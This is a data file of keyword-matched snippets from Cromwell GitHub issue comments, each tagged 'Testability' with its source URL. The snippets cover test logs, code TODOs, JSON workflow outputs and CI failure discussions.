org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:410); at scala.collection.immutable.List.foreach(List.scala:389); a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:1151,Test,TestSuite,1151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['Test'],['TestSuite']
Testability," seconds and the success message appears to be cut off:. ```; Pulling repository docker.io/library/ubuntu; age for ubuntu:latest; ```. The Docker test looks like it's going fine until it's time to actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:1547,test,test-system,1547,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['test'],['test-system']
Testability," the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/jes/src/test/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActorSpec.scala: // TODO: PBE: This spec may run faster by going back to mocks? Also, building the actor ref is copy/pasted a lot; ./supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: This test needs work. If the abort fires to quickly, it causes a race condition in waitAndPostProcess.; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: abort doesn't actually seem to abort. It runs the full 10 seconsds, then returns the response.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:2223,test,test,2223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,5,"['mock', 'test']","['mocks', 'test']"
Testability," the following output near the top of the log, so it looks like an issue with selecting the right credentials. In other words, I think this is an application logic issue in GCP Batch rather than an environment problem. (Cromwell uses service account auth for everything but local development.); ```; Activated service account credentials for: [cromwell@broad-dsde-cromwell-dev.iam.gserviceaccount.com]; ```. Plausibly responsible party to fix: Burwood. ---. 2. DRS-related failures in [Centaur Horicromtal PapiV2 Beta](https://github.com/broadinstitute/cromwell/actions/runs/5590808626/jobs/10221030693?pr=7177#logs) seem to be the downstream of not being able to build/push the `cromwell-drs-localizer` image. Example error below; images should appear [in the GCR for `broad-dsde-cromwell-dev`](https://console.cloud.google.com/gcr/images/broad-dsde-cromwell-dev/global/cromwell-drs-localizer?project=broad-dsde-cromwell-dev) and the named one does not exist. ```; Error response from daemon:; manifest for gcr.io/broad-dsde-cromwell-dev/cromwell-drs-localizer:github-5590808626 not found; ```. I've replicated the inability to build locally, including on `develop`, and am iterating in this PR: https://github.com/broadinstitute/cromwell/pull/7179. Plausibly responsible party to fix: Broad. ---. 3. Unit tests are [failing](https://github.com/broadinstitute/cromwell/actions/runs/5590808615/jobs/10221028981?pr=7177) because an assertion is looking for different paths in some cases. Examples:. ```; GcpBatchFileInput(""wf_whereami.whereami.stringToFileMap-0"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; where the relevant element present is; ```; GcpBatchFileInput(""stringToFileMap"", gs://path/to/stringTofile1, path/to/stringTofile1, local-disk 200 SSD); ```; as well as; ```; List(""/mnt/read/only/container:/mnt/read/only/container:""); ```; versus; ```; List(""/mnt/read/only/container:/mnt/read/only/container""); ```. Plausibly responsible party to fix: Burwood",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966:1784,test,tests,1784,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7177#issuecomment-1641142966,2,"['assert', 'test']","['assertion', 'tests']"
Testability," to start to develop Cromwell, because the docs just went into how to compile it on a host. So it made sense to make it easy for the developer to develop Cromwell so I made a Dockerfile to do that:; - https://github.com/broadinstitute/cromwell/pull/4002. Woohoo merged! We needed to have tests too, so I followed up on that:; - https://github.com/broadinstitute/cromwell/pull/4015 . But unfortunately it was decided that CircleCI was too new / needed to learn stuff (this is ok!) so it's going to be closed. . ## Question 2: How do we add a Singularity backend?. But this is actually ok, because we realize that we don't need to add Singularity to Cromwell proper, it can just be a backend! But I didn't understand wdl, or any of the formats, so my crew in Cherry lab gave me a solid repo to startwith, and then it started to click!; - https://github.com/vsoch/wgbs-pipeline/pull/1. I was waiting for the Dockerfile test PR to pass, but realized it probably wouldn't, so I jumped on adding the example backend workflows (still without totally understanding what/why/how, but figuring out as I went):; - https://github.com/broadinstitute/cromwell/pull/4039. ## Question 3: But what about Cromwell+Singularity on Travis?. I got confused again when there were [requests for additional tests](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519) (and something entirely different) that it made me step back. I had this growing feeling that started to solidify that there are too many layers. I am developing things and I **still** don't understand (or think Singularity is ready yet) to be any kind of backend. I'm forcing a dog into a cat shaped hole just because this is the hole I'm supposed to fill. Is that a good idea? I've lost sight of what the tool is trying to do. Cromwell is trying to make it easy to run a Singularity container. But if that's the case, then why has this command:. ```bash; singularity run shub://vsoch/hello-world; ```. turned into needing Cromwell (",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:8629,test,test,8629,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['test'],['test']
Testability," {; ""left"": 2,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/4.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-1/execution/4.txt.copy""]; }, {; ""left"": 3,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/6.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-2/execution/6.txt.copy""]; }, {; ""left"": 4,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/7.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-3/execution/7.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/1.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-4/execution/1.txt.copy""],; ""left"": 5; }, {; ""left"": 6,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/3.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-5/execution/3.txt.copy""]; }, {; ""left"": 7,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/5.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-Ge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:2245,test,test-cromwell-map,2245,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability," {; ""left"": 3,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/6.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-2/execution/6.txt.copy""]; }, {; ""left"": 4,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/7.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-3/execution/7.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/1.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-4/execution/1.txt.copy""],; ""left"": 5; }, {; ""left"": 6,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/3.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-5/execution/3.txt.copy""]; }, {; ""left"": 7,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/5.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/8.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-7/execution/8.txt.copy""]; }, {; ""left"": 9,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-Ge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:2568,test,test-cromwell-map,2568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability," {; ""left"": 7,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/5.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/8.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-7/execution/8.txt.copy""]; }, {; ""left"": 9,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/9.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-8/execution/9.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/2.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-9/execution/2.txt.copy""],; ""left"": 10; }]; },; ""id"": ""67295907-5ffe-486e-8c7d-2bfdc5c5f97d""; }; ```. This results are always the same between runs. It looks more like a problem in the way that the maps are handled, either one or both of this:. * `read_map` initializes an unsorted map, which does not preserve the file order when scatter is performed; * Scatter a map does not preserve the order of iteration, even if the `read_map` maintains the insertion order. I am not sure if in a `Map` the order is supposed to be preserved, but it would be nice in the case something like this toy-script works to keep an ordered map. I can work around this by using two files in `GenerateMap` (one for the numbers and one for the files), read both with `read_lines` and then `zip` both of them to return a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:3800,test,test-cromwell-map,3800,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability,"![19grnh](https://cloud.githubusercontent.com/assets/791985/17954234/7ba0b698-6a47-11e6-873c-c0e60ca163e1.jpg). I'd be game if all `java.nio.Path`s across cromwell, including the engine, all backends, services, etc. were always absolute. A relative path appearing in a web response, a shell script, or even the logs would then be considered a bug. In JES, there are internal private methods such as `JesAsyncBackendJobExecutionActor.relativeLocalizationPath` that create relative paths, but these relative paths should not be externally visible. `JesAsyncBackendJobExecutionActor.jesInputsFromWdlFiles` should be creating absolute paths. Over in the SFS, the `SharedFileSystemAsyncJobExecutionActor` doesn't create relative paths, but still inconsistently calls `Path.toAbsolutePath` in various places. More usage of `better.files` instead of `java.nio.Paths.get()` would help us from omitting calls to `Path.toAbsolutePath`, since [better's `.path` member](https://github.com/pathikrit/better-files#java-interoperability) creates absolute `java.nio.Path`s (for [now](https://github.com/pathikrit/better-files/issues/48#issuecomment-157837460)). **TL;DR This might also be a problem elsewhere, including the SFS backend.**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1332#issuecomment-242266539:311,log,logs,311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1332#issuecomment-242266539,1,['log'],['logs']
Testability,![nirvana-logo](https://user-images.githubusercontent.com/961771/211111004-278e4d49-b736-4a16-a945-fcf715eb76ca.jpeg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1374208928:10,log,logo,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6975#issuecomment-1374208928,1,['log'],['logo']
Testability,""", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-2/execution/6.txt.copy""]; }, {; ""left"": 4,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/7.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-3/execution/7.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/1.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-4/execution/1.txt.copy""],; ""left"": 5; }, {; ""left"": 6,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/3.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-5/execution/3.txt.copy""]; }, {; ""left"": 7,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/5.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/8.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-7/execution/8.txt.copy""]; }, {; ""left"": 9,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/9.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-8/execution",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:2704,test,test-cromwell-map,2704,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability,""", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-3/execution/7.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/1.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-4/execution/1.txt.copy""],; ""left"": 5; }, {; ""left"": 6,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/3.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-5/execution/3.txt.copy""]; }, {; ""left"": 7,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/5.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/8.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-7/execution/8.txt.copy""]; }, {; ""left"": 9,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/9.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-8/execution/9.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/2.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-9/execution/2.txt.copy""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:3015,test,test-cromwell-map,3015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability,""", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-5/execution/3.txt.copy""]; }, {; ""left"": 7,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/5.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-6/execution/5.txt.copy""]; }, {; ""left"": 8,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/8.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-7/execution/8.txt.copy""]; }, {; ""left"": 9,; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/9.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-8/execution/9.txt.copy""]; }, {; ""right"": [""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-GenerateMap/execution/2.txt"", ""/Users/daniel/Desktop/test-cromwell-map/execution/TestWorkflow/67295907-5ffe-486e-8c7d-2bfdc5c5f97d/call-CopyFile/shard-9/execution/2.txt.copy""],; ""left"": 10; }]; },; ""id"": ""67295907-5ffe-486e-8c7d-2bfdc5c5f97d""; }; ```. This results are always the same between runs. It looks more like a problem in the way that the maps are handled, either one or both of this:. * `read_map` initializes an unsorted map, which does not preserve the file order when scatter is performed; * Scatter a map does not preserve the order of iteration, even if the `read_map` maintains the insertion order. I am not sure if in a `Map` the order is supposed to be preserved, but it would be nice in the case something like this toy-script works to keep an ordered map. I can work around th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779:3637,test,test-cromwell-map,3637,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368445779,2,"['Test', 'test']","['TestWorkflow', 'test-cromwell-map']"
Testability,"""; },; {; ""startTime"": ""2018-04-04T06:49:14.698Z"",; ""description"": ""UpdatingJobStore"",; ""endTime"": ""2018-04-04T06:49:15.680Z""; },; {; ""startTime"": ""2018-04-04T03:55:10.042468067Z"",; ""description"": ""start"",; ""endTime"": ""2018-04-04T03:55:14.019652794Z""; },; {; ""startTime"": ""2018-04-04T03:54:17.593Z"",; ""description"": ""CheckingCallCache"",; ""endTime"": ""2018-04-04T03:54:20.370Z""; },; {; ""startTime"": ""2018-04-04T04:20:16.453751287Z"",; ""description"": ""running-docker"",; ""endTime"": ""2018-04-04T06:35:13.639652324Z""; },; {; ""startTime"": ""2018-04-04T03:54:17.587Z"",; ""description"": ""WaitingForValueStore"",; ""endTime"": ""2018-04-04T03:54:17.588Z""; }; ]; }; ],; ""MarkDuplicates.ClassicMarkDuplicates"": [; {; ""preemptible"": false,; ""executionStatus"": ""Running"",; ""stdout"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/ClassicMarkDuplicates-stdout.log"",; ""backendStatus"": ""Running"",; ""shardIndex"": -1,; ""jes"": {; ""executionBucket"": ""gs://broad-dsde-methods/cromwell-execution-30"",; ""endpointUrl"": ""https://genomics.googleapis.com/"",; ""googleProject"": ""broad-dsde-methods""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 1 LOCAL"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""cpu"": ""4"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-a,us-central1-b,us-east1-d,us-central1-c,us-central1-f,us-east1-c"",; ""memory"": ""16 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ""inputs"": {; ""outputName"": ""md"",; ""bam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1""; },; ""backendLabels"": {; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""wdl-task-name"": ""classicmarkduplicates""; },; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:3826,log,log,3826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['log'],['log']
Testability,"""Absence of evidence is not evidence of absence"", but still... ""proof"" these changes didn't make any thing worse in Jenkins, so far.; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/778/. Also [this log](https://travis-ci.org/broadinstitute/cromwell/jobs/445976070) shows a 10s timeout for the additionally patched `SimpleWorkflowActorSpec`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4313#issuecomment-432909067:197,test,test-runner,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4313#issuecomment-432909067,2,"['log', 'test']","['log', 'test-runner']"
Testability,"""Horicromtal Deadlock"" test is a transient Docker pull issue and passed as of the last code change; only documentation changes since then.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7369#issuecomment-1964812905:23,test,test,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7369#issuecomment-1964812905,1,['test'],['test']
